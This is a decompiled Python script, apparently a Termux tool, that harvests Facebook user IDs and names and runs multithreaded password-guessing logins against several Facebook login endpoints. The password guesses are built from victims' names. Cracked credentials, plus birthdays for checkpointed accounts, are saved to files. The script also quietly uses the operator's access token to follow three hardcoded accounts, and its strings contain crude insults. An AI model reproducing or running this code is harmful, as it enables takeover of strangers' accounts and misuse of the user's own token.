# Decompile by Mardis (Tools By Kapten-Kaizo)
# Time Succes decompile : 2022-03-26 09:16:18.844062
import os
try:
    import requests
except ImportError:
    print ('\nModul requests Belum Terinstall\n\n')
    os.system('pip2 install requests')
try:
    import concurrent.futures
except ImportError:
    print ('\nModul futures Belum Terinstall\n\n')
    os.system('pip2 install futures')
try:
    import bs4
except ImportError:
    print ('\nModul bs4 Belum Terinstall\n\n')
    os.system('pip2 install bs4')
import requests, os, re, bs4, sys, json, time, random, datetime
from concurrent.futures import ThreadPoolExecutor as BhBauk
from datetime import datetime
from bs4 import BeautifulSoup as par
from random import randint
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
ok = []
cp = []
id = []
user = []
num = 0
loop = 0
Ella_Boy = print
Boy_Ella = open
Sayang_ella = requests.get
_Hayang_Kawin_  = requests.Session()
url_mb = "https://mbasic.facebook.com"
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan_key = {"january": "January", "february": "February", "march": "March", "april": "April", "may": "May", "june": "June", "july": "July", "august": "August", "september": "September", "october": "October", "november": "November", "december": "December"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_realme = 'Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3'
P = '\x1b[1;97m' # PUTIH
M = '\033[0;91m' # MERAH 
H = '\033[0;92m' # HIJAU 
K = '\033[0;93m' # KUNING 
B = '\033[0;94m' # BIRU 
U = '\033[0;95m' # UNGU 
O = '\033[0;96m' # BIRU MUDA
N = '\033[0m'	# WARNA MATI 
def banner():
    Ella_Boy(""" \033[0m_______ ______ _______ _______      ______ _______
|       |   __ \    ___|    |  |    |   __ \       |
|   -   |    __/    ___|       |    |   __ <   -   |
|_______|___|  |_______|__|____|    |______/_______|

AU > Boy Hamzah
EF > TUMBAL TERMUX
GH > https://github.com/Tumbal-termux
NS > OPEN BO
────────────────────────────────────────────────────
""");time.sleep(0.03)
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        Ella_Boy('\n\n\033[0mSELESAI')
        Ella_Boy('\n\033[0;92mRESULTS > %s'%(str(len(ok))))
        Ella_Boy('\033[0;93mCHECK > %s'%(str(len(cp))));exit()
    else:
        Ella_Boy('\n\033[0mTidak Mendapatkan Hasil')
        exit()
def login():
	os.system("clear")
	banner()
	token = input("\nScript Ini Menggunakan Login Token Masukan Token Kamu\n\nToken Facebook : ")
	try:
		nama = Sayang_ella(f"https://graph.facebook.com/me?&access_token=%s"%(token)).json()["name"]
		token = Boy_Ella("token.txt","w").write(token)
		print(f"\n%sHallo : %s%s %sNGENTOT :)"%(N,H,nama,N))
		time.sleep(3)
		bot()
	except KeyError:
		os.system('rm -rf token.txt')
		Ella_Boy("\nToken invalid")
		time.sleep(3)
		login()
def menu():
	os.system("clear")
	banner()
	try:
		token = Boy_Ella("token.txt","r").read()
	except FileNotFoundError:
		Ella_Boy("\nToken Kadaluarsa")
		time.sleep(3)
		login()
	try:
		nama = Sayang_ella(f"https://graph.facebook.com/me?&access_token={token}").json()["name"]
	except (KeyError,IOError):
		os.system('rm -rf token.txt')
		Ella_Boy("\nToken Tidak Bisa Di Pakai Silahkan Ganti Token Baru")
		time.sleep(3)
		login()
	kadal()
	Ella_Boy(f"\nHaii : {nama}")
	Ella_Boy("\n01.) Dump ID Dari Teman")
	Ella_Boy("02.) Dump ID Dari Publik")
	Ella_Boy("03.) Dump ID Dari Followers")
	Ella_Boy("04.) Dump ID Dari Postingan")
	Ella_Boy("05.) Mulai Crack")
	Ella_Boy("06.) Keluar")
	Ella_Boy("00.) Hapus Token")
	Lope = input("\nPilih : ")
	if Lope in[""," "]:
		Ella_Boy("\nJangan Kosong");time.sleep(1);menu()
	elif Lope in["1","01"]:
		dump_teman(token)
	elif Lope in["2","02"]:
		dump_publik(token)
	elif Lope in["3","03"]:
		dump_followers(token)
	elif Lope in["4","04"]:
		dump_postingan(token)
	elif Lope in["5","05"]:
		__crack__().plerr()
	elif Lope in["6","06"]:
		Ella_Boy("\nSelamat Tinggal\n\n");exit()
	elif Lope in["0","00"]:
		out = input("\nApakah Anda Yakin Ingin Menghapus Token.? [y/t]\n\n Pilih : ")
		if Lope in["y","Y"]:
			os.system('rm -rf token.txt')
			exit("\nBerhasil Menghapus Token")
	else:
		Ella_Boy("\nTolol Ya");exit()
def dump_teman(token):
	file = input("\nNama File : ")
	try:
		files = (file+"-Open.BO")
		xx = Boy_Ella(files,"w")
		for i in Sayang_ella(f"https://graph.facebook.com/me?fields=friends.fields(id,name)&access_token={token}").json()["friends"]["data"]:
			id.append(i["id"]+"<=>"+i["name"])
			xx.write(i["id"]+"<=>"+i["name"]+"\n")
			sys.stdout.write(f"\rTotal ID : {len(id)}");sys.stdout.flush();time.sleep(0.0050)
		Ella_Boy(f"\n\nBerhasil Dump ID")
		Ella_Boy(f"\nSalin Nama File : {files}")
		input(f"Tekan Enter Untuk Kembali");menu()
	except KeyError:
		exit("\nTidak Ada Teman")
def dump_publik(token):
	idt = input("\nID Publik : ")
	file = input("Nama File : ")
	try:
		files = (file+"-Open.BO")
		xx = Boy_Ella(files,"w")
		for i in Sayang_ella(f"https://graph.facebook.com/{idt}?fields=friends.fields(id,name)&access_token={token}").json()["friends"]["data"]:
			id.append(i["id"]+"<=>"+i["name"])
			xx.write(i["id"]+"<=>"+i["name"]+"\n")
			sys.stdout.write(f"\rTotal ID : {len(id)}");sys.stdout.flush();time.sleep(0.0050)
		Ella_Boy(f"\n\nBerhasil Dump ID")
		Ella_Boy(f"\nSalin Nama File : {files}")
		input(f"Tekan Enter Untuk Kembali");menu()
	except KeyError:
		exit("\nTeman Di Privasi")
def dump_followers(token):
	idt = input("\nID Pengikut : ")
	file = input("Nama File : ")
	try:
		files = (file+"-Open.BO")
		xx = Boy_Ella(files,"w")
		for i in Sayang_ella(f"https://graph.facebook.com/{idt}/subscribers?limit=10000&access_token={token}").json()["data"]:
			id.append(i["id"]+"<=>"+i["name"])
			xx.write(i["id"]+"<=>"+i["name"]+"\n")
			sys.stdout.write(f"\rTotal ID : {len(id)}");sys.stdout.flush();time.sleep(0.0050)
		Ella_Boy(f"\n\nBerhasil Dump ID")
		Ella_Boy(f"\nSalin Nama File : {files}")
		input(f"Tekan Enter Untuk Kembali");menu()
	except KeyError:
		exit("\nPengikut Mungkin Di Privasi")
def dump_postingan(token):
	idt = input("\nID Postingan : ")
	file = input("Nama File : ")
	try:
		files = (file+"-Open.BO")
		xx = Boy_Ella(files,"w")
		for i in Sayang_ella(f"https://graph.facebook.com/{idt}/likes/fields?limit=100000&access_token={token}").json()["data"]:
			id.append(i["id"]+"<=>"+i["name"])
			xx.write(i["id"]+"<=>"+i["name"]+"\n")
			sys.stdout.write(f"\rTotal ID : {len(id)}");sys.stdout.flush();time.sleep(0.0050)
		Ella_Boy(f"\n\nBerhasil Dump ID")
		Ella_Boy(f"\nSalin Nama File : {files}")
		input(f"Tekan Enter Untuk Kembali");menu()
	except KeyError:
		exit("\nID Postingan Tidak Ada")
class __crack__:
    def __init__(self):
        self.id = []
    def plerr(self):
        try:
            self.apk = input('\nNama File : ')
            self.id = Boy_Ella(self.apk).read().splitlines()
            Ella_Boy('Total ID : %s'%(len(self.id)))
        except:
            Ella_Boy('\nNama File Tidak Ada... Silahkan Dump ID Terlebih Dahulu')
            input('\nTekan ENTER Untuk Kembali');menu()
        _jokowi_kontol_ = input('\nIngin Menggunakan Sandi Manual.? [ y/t ]\n\nPilih : ')
        if _jokowi_kontol_ in ('Y', 'y'):
            Ella_Boy('\n[ CONTOH SANDI ] sayang,pengen,ngentot DLL')
            while True:
                pwek = raw_input('\nSandi : ')
                Ella_Boy('Sandi > %s'%(pwek))
                if pwek == '':
                    Ella_Boy('\nJangan Kosong')
                    time.sleep(1)
                    exit()
                elif len(pwek)<=5:
                    Ella_Boy('\nSandi Harus 6 Karakter Lebih Tidak Masalah')
                else:
                    def _sempak_(bse=None):
                        boy = input('\nPilih : ')
                        if boy == '':
                            Ella_Boy('\nJangan Kosong')
                            time.sleep(1);self._sempak_()
                        elif boy == "1" or boy == "01":
                            Ella_Boy('\nHasil RESULTS Tersimpan Di > multiresuts.txt')
                            Ella_Boy('Hasil CHECK Tersimpan Di > checkpoint.txt')
                            Ella_Boy('\n\t          SEMOGA BERUNTUNG\n\n')
                            with BhBauk(max_workers=35) as (_ngentot_gratis_):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        _ngentot_gratis_.submit(self.__api__, kimochi, bse)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        elif boy == "2" or boy == "02":
                            Ella_Boy('\nHasil RESULTS Tersimpan Di > multiresuts.txt')
                            Ella_Boy('Hasil CHECK Tersimpan Di > checkpoint.txt')
                            Ella_Boy('\n\t          SEMOGA BERUNTUNG\n\n')
                            with BhBauk(max_workers=25) as (_ngentot_gratis_):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        _ngentot_gratis_.submit(self.__mbasic__, kimochi, bse)
                                    except: pass
                            os.remove(self.apk)
                            hasil(ok,cp)
                        elif boy == "3" or boy == "03":
                            Ella_Boy('\nHasil RESULTS Tersimpan Di > multiresuts.txt')
                            Ella_Boy('Hasil CHECK Tersimpan Di > checkpoint.txt')
                            Ella_Boy('\n\t          SEMOGA BERUNTUNG\n\n')
                            with BhBauk(max_workers=20) as (_ngentot_gratis_):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        _ngentot_gratis_.submit(self.__mfb,__, kimochi, bse)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        else:
                            Ella_Boy('\nSalah')
                            exit()
                    Ella_Boy('\n\t         PILIH METODE CRACK NYA')
                    Ella_Boy('\n01.) Metode b-api [ Crack Cepat ] Check SEMUA')
                    Ella_Boy('02.) Metode mbasic [ Crack Lambat ] Check Berkurang')
                    Ella_Boy('03.) Metode Mobile [ Crack + lambat ] Check Sedikit')
                    _sempak_(pwek.split(','))
                    break
        elif _jokowi_kontol_ in ('T', 't'):
            Ella_Boy('\n\t         PILIH METODE CRACK NYA')
            Ella_Boy('\n01.) Metode b-api [ Crack Cepat ] Check SEMUA')
            Ella_Boy('02.) Metode mbasic [ Crack Lambat ] Check Berkurang')
            Ella_Boy('03.) Metode Mobile [ Crack + lambat ] Check Sedikit')
            self.__pler__()
        else:
            Ella_Boy('\nIdiot Kah.?')
            exit()
        return
    def __api__(self, user, _sempak_):
        global ok,cp,loop
        sys.stdout.write('\r\033[0m[ %s-%s ] \033[0;92mRESULTS [ %s ] \033[0;93mCHECK [ %s ]'%(loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in _sempak_:
            pw = pw.lower()
            try: os.mkdir('')
            except: pass
            try:
            	ua_xiaomi = Boy_Ella('agent.txt', 'r').read()
            except (KeyError, IOError):
            	ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            p = Sayang_ella("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pw+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
            if "access_token" in p:
                Ella_Boy('\r\033[0;92mRESULTS %s - %s%s      '%(user,pw,tahun(user)))
                wrt = '%s - %s %s'%(user,pw,tahun(user))
                ok.append(wrt)
                open('checkpoint.txt','a').write('%s\n' % wrt)
                break
                continue
            elif "www.facebook.com" in p["error_msg"]:
                try:
                    token = Boy_Ella('login.txt').read()
                    cp_ttl = Sayang_ella('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    Ella_Boy('\r\033[0;93mCHECK %s - %s %s - %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
                    wrt = '%s - %s - %s %s %s%s'% (user,pw,day,month,year,tahun(user))
                    cp.append(wrt)
                    open('checkpoint.txt','a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                Ella_Boy('\r\033[0;93mCHECK %s - %s%s      '%(user,pw,tahun(user)))
                wrt = '%s - %s%s' % (user,pw,tahun(user))
                cp.append(wrt)
                open('checkpoint.txt','a').write('%s\n' % wrt)
                break
                continue
        loop += 1
    def __mbasic__(self, user, _sempak_):
        global ok,cp,loop
        sys.stdout.write('\r\033[0m[ %s-%s ] \033[0;92mRESULTS [ %s ] \033[0;93mCHECK [ %s ]'%(loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in _sempak_:
            pw = pw.lower()
            try: os.mkdir('')
            except: pass
            try:
            	ua_xiaomi = Boy_Ella('agent.txt', 'r').read()
            except (KeyError, IOError):
            	ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            headers_ = {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":ua_xiaomi,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
            p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
            dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
            _headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua_xiaomi,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
            po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
            if 'c_user' in ses.cookies.get_dict():
                Ella_Boy('\r\033[0;92mRESULTS %s - %s      ' % (user,pw))
                wrt = '%s - %s' % (user,pw)
                ok.append(wrt)
                open('multiresults.txt','a').write('%s\n' % wrt)
                break
                continue
            elif 'checkpoint' in ses.cookies.get_dict():
                try:
                    token = Boy_Ella('token.txt').read()
                    cp_ttl = Sayang_ella('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    Ella_Boy('\r\033[0;93mCHECK %s - %s - %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
                    wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
                    cp.append(wrt)
                    open('checkpoint.txt','a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                Ella_Boy('\r\033[0;93mCHECK %s - %s%s      ' % (user,pw,tahun(user)))
                wrt = '%s - %s%s'%(user,pw,tahun(user))
                cp.append(wrt)
                open('checkpoint.txt','a').write('%s\n' % wrt)
                break
                continue
        loop += 1
    def __mfb__(self, user, _sempak_):
        global ok,cp,loop
        sys.stdout.write('\r\033[0m[ %s-%s ] \033[0;92mRESULTS [ %s ] \033[0;93mCHECK [ %s ]'%(loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in _sempak_:
            pw = pw.lower()
            try: os.mkdir('')
            except: pass
            try:
            	ua_xiaomi = Boy_Ella('agent.txt', 'r').read()
            except (KeyError, IOError):
            	ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            headers_ = {"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":ua_xiaomi,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
            p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
            dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
            _headers = {"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
            po = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
            if 'c_user' in ses.cookies.get_dict():
                Ella_Boy('\r\033[0;92mRESULTS %s - %s      '%(user,pw))
                wrt = '%s - %s - %s' % (user,pw)
                ok.append(wrt)
                open('multiresults.txt','a').write('%s\n' % wrt)
                break
                continue
            elif 'checkpoint' in ses.cookies.get_dict():
                try:
                    token = Boy_Ella('token.txt').read()
                    cp_ttl = Sayang_ella('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    Ella_Boy('\r\033[0;93mCHECK %s - %s - %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
                    wrt = '%s - %s - %s %s %s'%(user,pw,day,month,year)
                    cp.append(wrt)
                    open('checkpoint.txt','a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                Ella_Boy('\r\033[0;93mCHECK %s - %s%s      ' % (user,pw,tahun(user)))
                wrt = '%s - %s%s'%(user,pw,tahun(user))
                cp.append(wrt)
                open('checkpoint.txt','a').write('%s\n' % wrt)
                break
                continue
        loop += 1
    def __pler__(self):
        yan = input('\n> ')
        if yan == '':
            Ella_Boy('\nJangan Kosong')
            exit()
        elif yan in ('1', '01'):
            Ella_Boy('\nHasil RESULTS Tersimpan Di > multiresults.txt')
            Ella_Boy('Hasil CHECK Tersimpan Di > checkpoint.txt')
            Ella_Boy('\n\t          SEMOGA BERUNTUNG\n\n')
            with BhBauk(max_workers=35) as (_ngentot_gratis_):
            	for yntkts in self.id:
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 1:
                        	pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        elif len(xz) == 2:
                        	pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        elif len(xz) == 3:
                        	pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        elif len(xz) == 4:
                        	pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        else:
                        	pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        _ngentot_gratis_.submit(self.__api__, uid, pwx)
                    except:
                        pass
            os.remove(self.apk)
            hasil(ok,cp)
        elif yan in ('2', '02'):
            Ella_Boy('\nHasil RESULTS Tersimpan Di > multiresults.txt')
            Ella_Boy('Hasil CHECK Tersimpan Di > checkpoint.txt')
            Ella_Boy('\n\t          SEMOGA BERUNTUNG\n\n')
            with BhBauk(max_workers=25) as (_ngentot_gratis_):
            	for yntkts in self.id:
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 1:
                        	pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        elif len(xz) == 2:
                        	pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        elif len(xz) == 3:
                        	pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        elif len(xz) == 4:
                        	pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        else:
                        	pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        _ngentot_gratis_.submit(self.__mbasic__, uid, pwx)
                    except:
                        pass
            os.remove(self.apk)
            hasil(ok,cp)
        elif yan in ('3', '03'):
            Ella_Boy('\nHasil RESULTS Tersimpan Di > multiresults.txt')
            Ella_Boy('Hasil CHECK Tersimpan Di > checkpoint.txt')
            Ella_Boy('\n\t          SEMOGA BERUNTUNG\n\n')
            with BhBauk(max_workers=20) as (_ngentot_gratis_):
            	for yntkts in self.id:
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 1:
                        	pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        elif len(xz) == 2:
                        	pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        elif len(xz) == 3:
                        	pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        elif len(xz) == 4:
                        	pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        else:
                        	pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        _ngentot_gratis_.submit(self.__mfb__, uid, pwx)
                    except:
                        pass
            os.remove(self.apk)
            hasil(ok,cp)
        else:
            Ella_Boy('\nSalah')
            time.sleep(1)
            self.__pler__()
def tahun(fx):
    if len(fx)==15:
        if fx[:10] in ['1000000000']       :tahunz = ' - 2009'
        elif fx[:9] in ['100000000']       :tahunz = ' - 2009'
        elif fx[:8] in ['10000000']        :tahunz = ' - 2009'
        elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = ' - 2009'
        elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = ' - 2010'
        elif fx[:6] in ['100001']          :tahunz = ' - 2010/2011'
        elif fx[:6] in ['100002','100003'] :tahunz = ' - 2011/2012'
        elif fx[:6] in ['100004']          :tahunz = ' - 2012/2013'
        elif fx[:6] in ['100005','100006'] :tahunz = ' - 2013/2014'
        elif fx[:6] in ['100007','100008'] :tahunz = ' - 2014/2015'
        elif fx[:6] in ['100009']          :tahunz = ' - 2015'
        elif fx[:5] in ['10001']           :tahunz = ' - 2015/2016'
        elif fx[:5] in ['10002']           :tahunz = ' - 2016/2017'
        elif fx[:5] in ['10003']           :tahunz = ' - 2018/2019'
        elif fx[:5] in ['10004']           :tahunz = ' - 2019/2020'
        elif fx[:5] in ['10005']           :tahunz = ' - 2020'
        elif fx[:5] in ['10006','10007','10008']:tahunz = ' - 2021'
        else:tahunz=''
    elif len(fx) in [9,10]:
        tahunz = ' - 2008/2009'
    elif len(fx)==8:
        tahunz = ' - 2007/2008'
    elif len(fx)==7:
        tahunz = ' - 2006/2007'
    else:tahunz=''
    return tahunz
def bot():
    try:
        token = open('token.txt', 'r').read()
    except IOError:
        Ella_Boy('\nToken Invalid');time.sleep(2);login()
        os.system('rm -rf token.txt')
    requests.post('https://graph.facebook.com/100078831707344/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/106751971481203/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100007520203452/subscribers?access_token=' + token)
    menu()
def cekk():
    try:
        token = Boy_Ella("token.txt","r").read()
        x = Sayang_ella("https://graph.facebook.com/me?access_token=" + token)
        y = json.loads(x.text)
        n = y['name']
        i = y['id']
        Ella_Boy("\nHallo > " + n)
        time.sleep(1),menu()
    except (KeyError,IOError):
        Ella_Boy("\nLu Belum Masuk NGENTOT")
        os.system('rm -rf token.txt')
        time.sleep(1),login()
    except requests.exceptions.ConnectionError:
        Ella_Boy("\nKoneksi Bermasalah")
        os.system('rm -rf token.txt')
        time.sleep(1),exit()
def animasi():
	Ella_Boy("\033[0m_______________________¶¶¶________________________");time.sleep(0.04)
	Ella_Boy("____________________¶¶¶¶¶¶¶¶¶¶¶___________________");time.sleep(0.04)
	Ella_Boy("__________________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_________________");time.sleep(0.04)
	Ella_Boy("________________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶________________");time.sleep(0.04)
	Ella_Boy("_______________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_______________");time.sleep(0.04)
	Ella_Boy("______________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶______________");time.sleep(0.04)
	Ella_Boy("_____________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_____________");time.sleep(0.04)
